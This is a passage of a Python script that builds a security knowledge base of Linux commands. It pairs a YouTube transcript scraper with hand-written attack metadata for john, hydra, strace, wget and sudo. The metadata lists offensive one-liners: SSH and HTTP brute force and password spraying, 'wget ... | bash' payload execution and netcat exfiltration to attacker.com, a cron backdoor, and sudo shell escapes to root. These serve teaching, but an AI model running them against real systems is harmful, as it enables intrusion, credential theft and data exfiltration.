            {"with": "ssh", "example": "ssh2john ~/.ssh/id_rsa > rsa.hash && john rsa.hash --wordlist=rockyou.txt", "note": "Crack passphrase-protected private key"},
        ],
        "cve_refs": [],
        "ctf_categories": ["crypto", "pwn"],
        "root_vs_user": {
            "root": "Can read /etc/shadow directly — no need to first obtain it via exploit",
            "user": "Needs shadow already exfiltrated; cracking itself requires no privileges",
        },
    },
    "hydra": {
        "hat": "black",
        "security_intent": "Network brute-force tool. Supports 50+ protocols: SSH, FTP, HTTP forms, RDP, SMTP, databases. Used for credential stuffing, password spraying, and service brute-force in penetration tests.",
        "attack_vectors": ["SSH brute force", "HTTP form credential stuffing", "FTP/SMTP brute force", "RDP password spray", "database authentication brute force"],
        "defense_use": "Testing account lockout policies, validating rate limiting, identifying weak service credentials.",
        "mitre_tags": ["T1110.001", "T1110.003", "T1078"],
        "threat_level": 5,
        "related_commands": ["nmap", "ssh", "curl", "nc"],
        "quick_use": [
            "hydra -l admin -P rockyou.txt ssh://10.0.0.1  # SSH brute force",
            "hydra -L users.txt -P passwords.txt ftp://10.0.0.1",
            "hydra -l admin -P rockyou.txt 10.0.0.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
            "hydra -L users.txt -p 'Summer2024!' ssh://10.0.0.0/24  # password spray subnet",
            "hydra -l root -P rockyou.txt mysql://10.0.0.1",
        ],
        "combinations": [
            {"with": "nmap", "example": "nmap -p 22 --open 10.0.0.0/24 -oG - | awk '/open/{print $2}' > ssh_hosts.txt && hydra -L users.txt -P rockyou.txt -M ssh_hosts.txt ssh", "note": "Auto-discover SSH hosts then brute force all of them"},
            {"with": "curl", "example": "# First: use curl to identify login form params\ncurl -si http://target.com/login | grep 'name='\n# Then: hydra -l admin -P rockyou.txt target.com http-post-form '/login:...'", "note": "Recon form params with curl before hydra"},
        ],
        "cve_refs": [],
        "ctf_categories": ["web", "network", "pwn"],
        "root_vs_user": {
            "root": "No functional difference for network attacks; can use more source ports and raw sockets",
            "user": "Full functionality for all supported protocols; no root needed",
        },
    },
    "strace": {
        "hat": "red",
        "security_intent": "System call tracer. Reveals exactly what a program does at the kernel boundary: file opens, network connections, exec calls, memory operations. Attackers use it to extract hardcoded credentials passed as arguments, discover hidden config files, and reverse engineer binary behavior.",
        "attack_vectors": ["credential extraction from process arguments", "config file path discovery", "binary behavior analysis", "anti-debug detection bypass"],
        "defense_use": "Debugging unexpected program behavior, incident response analysis of suspicious processes, malware behavior analysis.",
        "mitre_tags": ["T1057", "T1059.004", "T1552.004"],
        "threat_level": 3,
        "related_commands": ["ps", "lsof", "find", "grep"],
        "quick_use": [
            "strace -p PID                             # attach to running process",
            "strace -e openat,read,write -p PID        # trace only file operations",
            "strace -e execve command 2>&1 | grep exec # trace child process spawning",
            "strace -s 9999 -e read,write ./binary 2>&1 | grep -A2 'read('  # dump I/O",
            "strace -f -e network ./binary 2>&1        # trace network syscalls + forks",
        ],
        "combinations": [
            {"with": "grep", "example": "strace -e openat ./suspicious_binary 2>&1 | grep -v ENOENT | grep '\"/'", "note": "List all files the binary successfully opens"},
            {"with": "awk", "example": "strace -c ./binary 2>&1 | awk 'NR>2{print $NF, $1}' | sort -rn | head", "note": "Profile which syscalls take the most time"},
            {"with": "ps", "example": "ps aux | grep target_process | awk '{print $2}' | xargs strace -p", "note": "Auto-attach strace to a named process"},
        ],
        "cve_refs": [],
        "ctf_categories": ["pwn", "reversing"],
        "root_vs_user": {
            "root": "Can trace any process including system daemons; no ptrace_scope restrictions",
            "user": "Restricted by /proc/sys/kernel/yama/ptrace_scope; default on many distros blocks tracing other users' processes",
        },
    },
    "wget": {
        "hat": "red",
        "security_intent": "File retrieval tool with recursive crawling and mirror capability. Attackers use it to download payloads from C2 servers, spider internal web apps, and transfer exfiltrated data. `wget` is often present where `curl` is not.",
        "attack_vectors": ["payload delivery from C2", "internal web app spidering", "credential exposure via basic-auth URL", "recursive download for data exfil"],
        "defense_use": "Downloading security patches, mirroring documentation, fetching threat intelligence feeds.",
        "mitre_tags": ["T1105", "T1071.001", "T1567"],
        "threat_level": 3,
        "related_commands": ["curl", "nc", "python3"],
        "quick_use": [
            "wget -q http://10.0.0.1:8080/payload.sh -O- | bash  # download and execute",
            "wget -r -np -k http://internal.corp/         # mirror entire site",
            "wget --no-check-certificate https://10.0.0.1/file  # skip TLS verification",
            "wget -P /tmp http://10.0.0.1:8080/shell.elf  # save payload to /tmp",
            "wget -q -O- http://169.254.169.254/latest/meta-data/  # AWS IMDS SSRF",
        ],
        "combinations": [
            {"with": "bash", "example": "wget -qO- http://attacker.com/rev.sh | bash", "note": "One-liner fileless payload execution"},
            {"with": "python3", "example": "python3 -m http.server 8080 & wget http://localhost:8080/test  # test delivery", "note": "Verify payload delivery chain locally"},
            {"with": "nc", "example": "wget -q http://attacker.com/payload && nc attacker.com 4444 < payload", "note": "Download then exfil via nc"},
        ],
        "cve_refs": ["CVE-2021-31879 (wget cookie injection via redirect)", "CVE-2019-5953 (stack overflow in wget)"],
        "ctf_categories": ["web", "network"],
        "root_vs_user": {
            "root": "Can write anywhere; `wget -O /etc/cron.d/backdoor http://...` for persistence",
            "user": "Writes to user-writable paths; still fully functional for payload delivery",
        },
    },
    "sudo": {
        "hat": "black",
        "security_intent": "Privilege delegation tool that is simultaneously the most common Linux privilege escalation vector. Misconfigured sudoers entries (NOPASSWD, wildcards, GTFOBins-eligible commands) give attackers immediate root. `sudo -l` is always the first post-access command.",
        "attack_vectors": ["sudo -l privilege enumeration", "GTFOBins sudo escalation", "wildcard injection in sudo commands", "LD_PRELOAD environment variable abuse", "CVE-2021-3156 Baron Samedit heap overflow"],
        "defense_use": "Controlled privilege delegation, audit trail of elevated commands via syslog.",
        "mitre_tags": ["T1548.003", "T1069.001", "T1078.003"],
        "threat_level": 5,
        "related_commands": ["find", "python3", "awk", "vi"],
        "quick_use": [
            "sudo -l                                   # list allowed commands — always run first",
            "sudo -u victim command                    # run as another user",
            "sudo bash                                 # root shell if sudo bash is allowed",
            "sudo find / -exec /bin/bash \\;           # GTFOBins via find",
            "sudo awk 'BEGIN{system(\"/bin/bash\")}'    # GTFOBins via awk",
        ],
        "combinations": [
            {"with": "find", "example": "sudo find / -exec /bin/bash -ip \\;", "note": "Escalate to root shell via sudo find — GTFOBins classic"},
            {"with": "python3", "example": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", "note": "Instant root if python3 in sudoers"},
            {"with": "awk", "example": "sudo awk 'BEGIN{system(\"/bin/sh\")}'", "note": "GTFOBins awk shell escape"},
        ],
        "cve_refs": ["CVE-2021-3156 (Baron Samedit — heap overflow RCE)", "CVE-2021-3560 (authentication bypass)", "CVE-2019-14287 (sudo -u#-1 bypass)"],
        "ctf_categories": ["linux", "pwn"],
        "root_vs_user": {
            "root": "Full sudo functionality; can configure sudoers; can sudo as any user",
            "user": "`sudo -l` reveals the attack surface; single misconfigured entry gives root",
        },
    },
}

# ---------------------------------------------------------------------------
# Merge supplementary fields into SECURITY_METADATA at get_meta() time
# ---------------------------------------------------------------------------

def load_cache():
    if os.path.exists(CACHE_PATH):
        with open(CACHE_PATH) as f:
            return json.load(f)
    return {}

def save_cache(cache):
    with open(CACHE_PATH, "w") as f:
        json.dump(cache, f)

def fetch_transcript(video_id, cache):
    if video_id in cache:
        return cache[video_id]
    try:
        ytt = YouTubeTranscriptApi()
        entries = ytt.fetch(video_id)
        text = " ".join(e.text for e in entries)
        cache[video_id] = text
        return text
    except Exception as e:
        print(f"  [transcript error] {video_id}: {e}")
        cache[video_id] = ""
        return ""

def get_meta(command):
    key = command.lower().strip()
    base = SECURITY_METADATA.get(key, {
        "hat": "gray",
        "security_intent": f"Linux utility command '{command}'. Understand its behavior to recognize misuse.",
        "attack_vectors": [],
        "defense_use": "General system administration.",
        "mitre_tags": [],
        "threat_level": 1,
        "related_commands": [],
    })
    extras = COMMAND_EXTRAS.get(key, {})
    return {
        **base,
        "quick_use": extras.get("quick_use", []),
        "combinations": extras.get("combinations", []),
        "cve_refs": CVE_REFS.get(key, []),
        "ctf_categories": CTF_TAGS.get(key, []),
        "root_vs_user": ROOT_VS_USER.get(key, {}),
    }

def build_extra_tool(command, data):
    return {
        "id": f"extra_{command}",
        "title": f"The '{command}' Command In Linux",
        "command": command,
        "hat": data["hat"],
        "security_intent": data["security_intent"],
        "attack_vectors": data["attack_vectors"],
        "defense_use": data["defense_use"],
        "mitre_tags": data["mitre_tags"],
        "threat_level": data["threat_level"],
        "related_commands": data["related_commands"],
        "quick_use": data.get("quick_use", []),
        "combinations": data.get("combinations", []),
        "cve_refs": data.get("cve_refs", []),
        "ctf_categories": data.get("ctf_categories", []),
        "root_vs_user": data.get("root_vs_user", {}),
        "transcript": "",
        "video_url": "",
        "extra": True,
    }

def main():
    os.makedirs(os.path.dirname(OUT_PATH), exist_ok=True)
    cache = load_cache()

    print("Fetching playlist...")
    playlist = Playlist(f"https://www.youtube.com/playlist?list={PLAYLIST_ID}")
    raw_videos = []
    for v in playlist.videos:
        try:
            raw_videos.append({"id": v.video_id, "title": v.title})
        except Exception:
            continue
    print(f"Found {len(raw_videos)} videos.")

    videos = []
    for i, v in enumerate(raw_videos):
        vid_id = v["id"]
        title = v["title"]
        command = title.replace("The '", "").replace("' Command In Linux", "").strip()
        print(f"[{i+1}/{len(raw_videos)}] {command} ({vid_id})")

        transcript = fetch_transcript(vid_id, cache)
        save_cache(cache)

        meta = get_meta(command)
        videos.append({
            "id": vid_id,
            "title": title,
            "command": command,
            "hat": meta["hat"],
            "security_intent": meta["security_intent"],
            "attack_vectors": meta["attack_vectors"],
            "defense_use": meta["defense_use"],
            "mitre_tags": meta["mitre_tags"],
            "threat_level": meta["threat_level"],
            "related_commands": meta["related_commands"],
            "quick_use": meta["quick_use"],
            "combinations": meta["combinations"],
            "cve_refs": meta["cve_refs"],
            "ctf_categories": meta["ctf_categories"],
            "root_vs_user": meta["root_vs_user"],
            "transcript": transcript,
            "video_url": f"https://www.youtube.com/watch?v={vid_id}",
            "extra": False,
        })

    extra_tools = [build_extra_tool(cmd, data) for cmd, data in EXTRA_TOOLS.items()]
    all_entries = videos + extra_tools

    hat_counts = {"black": 0, "red": 0, "blue": 0, "gray": 0}
    for v in all_entries:
        hat_counts[v["hat"]] = hat_counts.get(v["hat"], 0) + 1

    knowledge = {
        "generated_at": datetime.utcnow().isoformat() + "Z",
        "total_videos": len(videos),
        "total_tools": len(all_entries),
        "hat_counts": hat_counts,
        "videos": all_entries,
        "attack_chains": ATTACK_CHAINS + EXTRA_CHAINS,
    }

    with open(OUT_PATH, "w", encoding="utf-8") as f:
        json.dump(knowledge, f, ensure_ascii=False, indent=2)

    print(f"\nDone. Saved to {OUT_PATH}")
    print(f"Playlist videos: {len(videos)} | Extra tools: {len(extra_tools)} | Total: {len(all_entries)}")
    print(f"Hat breakdown: {hat_counts}")
    print(f"Attack chains: {len(ATTACK_CHAINS + EXTRA_CHAINS)}")

if __name__ == "__main__":
    main()
